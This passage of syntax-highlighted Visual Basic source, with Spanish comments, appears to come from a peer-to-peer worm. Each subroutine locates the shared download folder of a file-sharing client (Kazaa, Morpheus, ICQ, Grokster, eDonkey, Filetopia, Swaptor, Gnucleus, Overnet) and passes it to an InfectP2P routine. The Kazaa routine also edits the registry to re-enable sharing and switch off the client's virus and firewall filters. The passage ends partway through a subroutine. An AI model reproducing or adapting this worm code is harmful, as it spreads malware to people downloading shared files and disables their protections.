</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">J0</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">J1</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc4">"c:\My Downloads\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Kazaa
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VKazaa</span><span class="sc6">()</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\KAZAA\LocalContent\DisableSharing"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\virus_filter"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc7">Rw</span><span class="sc0"> </span><span class="sc4">"HKEY_CURRENT_USER\Software\KAZAA\ResultsFilter\firewall_filter"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"REG_DWORD"</span><span class="sc0">
</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Software\KAZAA\LocalContent\Dir0"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_LOCAL_MACHINE\SOFTWARE\KAZAA\CloudLoad\ShareDir"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Xd</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Morpheus
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VMorpheus</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">Sh</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\share.cfg"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">Sh.AtendOfStream</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">False</span><span class="sc0">
</span><span class="sc7">H</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Sh.Readline</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"localhostt"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc3">Exit</span><span class="sc0"> </span><span class="sc3">Do</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">Sh.Close</span><span class="sc0">
</span><span class="sc7">C1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"localhostt"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">H</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">C1</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Step</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">M</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">M</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">C2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStr</span><span class="sc6">(</span><span class="sc7">M</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"5%"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">H</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">M</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">M</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">C2</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">For</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc3">To</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Step</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc7">k</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">H</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">x</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">D1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">k</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">k</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Df</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">k</span><span class="sc0">
</span><span class="sc7">Df</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Df</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"%5C"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">D1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Df</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Replace</span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"+"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Space</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\My Shared Folder\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Icq
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VIcq</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\shared files\"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Grokster
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VGrokster</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\My Grokster\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Software\Grokster\LocalContent\Dir0"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Right</span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">Sf</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Edonkey
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VEdonkey</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">E</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0">
</span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">E</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">E</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">D</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Cf.OpenTextFile</span><span class="sc6">(</span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"share.dat"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">Do</span><span class="sc0"> </span><span class="sc3">While</span><span class="sc0"> </span><span class="sc7">D.AtendOfStream</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0">
</span><span class="sc7">Sn</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Sn</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">D.Readline</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">vbCrLf</span><span class="sc0">
</span><span class="sc7">DoEvents</span><span class="sc0">
</span><span class="sc3">Loop</span><span class="sc0">
</span><span class="sc7">D.Close</span><span class="sc0">
</span><span class="sc7">s</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Split</span><span class="sc6">(</span><span class="sc7">Sn</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc2">18</span><span class="sc6">))</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&gt;=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">V</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">InStrRev</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">(</span><span class="sc7">UBound</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">)),</span><span class="sc0"> </span><span class="sc4">":"</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">(</span><span class="sc2">1</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc7">V</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">a</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">a</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">a</span><span class="sc0">
</span><span class="sc3">Else</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">),</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">s</span><span class="sc6">(</span><span class="sc2">0</span><span class="sc6">))</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">Set</span><span class="sc0"> </span><span class="sc7">F</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Nothing</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Filetopia
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VFiletopia</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc3">Dim</span><span class="sc0"> </span><span class="sc7">E</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc3">As</span><span class="sc0"> </span><span class="sc3">String</span><span class="sc0">
</span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Left</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">If</span><span class="sc0"> </span><span class="sc7">Dir</span><span class="sc6">(</span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Filetopia.INI"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">Then</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IniR</span><span class="sc6">(</span><span class="sc4">"ServerInclude"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Filetopia.INI"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Sf</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IniR</span><span class="sc6">(</span><span class="sc4">"ServerInclude"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"2"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Filetopia.INI"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Sf</span><span class="sc0">
</span><span class="sc7">Sf</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IniR</span><span class="sc6">(</span><span class="sc4">"Settings"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"DownloadPath"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">E</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Filetopia.INI"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Sf</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">If</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Swaptor
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VSwaptor</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Sw1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"Share\"</span><span class="sc0">
</span><span class="sc7">Sw2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">Rr</span><span class="sc6">(</span><span class="sc4">"HKEY_CURRENT_USER\Software\FileNavigator_26\SharedDirectories\0"</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Sw1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Sw2</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Gnucleus
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VGnucleus</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
</span><span class="sc7">Gnp</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc7">Gn1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IniR</span><span class="sc6">(</span><span class="sc4">"Share"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Dir0"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Gnp</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"GnuConfig.ini"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Gn1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Gn1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Gn1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">Gn2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">IniR</span><span class="sc6">(</span><span class="sc4">"Share"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc4">"Dir1"</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Gnp</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"GnuConfig.ini"</span><span class="sc6">):</span><span class="sc0"> </span><span class="sc7">Gn2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">Mid</span><span class="sc6">(</span><span class="sc7">Gn2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">Len</span><span class="sc6">(</span><span class="sc7">Gn2</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">"\"</span><span class="sc0">
</span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Gn1</span><span class="sc6">:</span><span class="sc0"> </span><span class="sc7">InfectP2P</span><span class="sc0"> </span><span class="sc7">Gn2</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Sub para obtener la ruta del folder compartido de Overnet
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">VOverNet</span><span class="sc6">(</span><span class="sc7">Xd</span><span class="sc6">)</span><span class="sc0">
</span><span class="sc3">On</span><span class="sc0"> </span><span class="sc3">Error</span><span class="sc0"> </span><span class="sc3">Resume</span><span class="sc0"> </span><span class="sc3">Next</span><span class="sc0">
